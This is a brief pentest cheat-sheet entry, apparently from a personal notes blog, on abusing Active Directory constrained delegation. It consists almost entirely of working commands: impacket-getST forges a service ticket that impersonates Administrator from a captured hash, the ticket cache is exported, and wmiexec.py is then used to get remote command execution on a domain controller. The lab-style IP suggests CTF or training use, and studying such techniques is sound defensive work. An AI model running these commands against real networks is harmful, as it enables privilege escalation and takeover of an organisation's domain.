---
title: "AllowedToDelegate"
date: 2024-7-23
tags: ["AllowedToDelegate", "gMSADumper", "active driectory", "ad", "Windows"]
---

---
### Craft a Ticket

```bash
# For example, spn: www/dc.example.com (Check Bloodhound)
sudo ntpdate -s 10.10.11.10 && impacket-getST -dc-ip 10.10.11.10 -spn www/dc.example.com -hashes :<HASH> -impersonate Administrator example.com/username
```

```bash
# Export ccache
export KRB5CCNAME=Administrator.ccache
```

```bash
# Remote
sudo ntpdate -s 10.10.11.10 && wmiexec.py -k -no-pass administrator@dc.example.com
```

<small>*Note: impacket-wmiexec may not work*</small>

<br>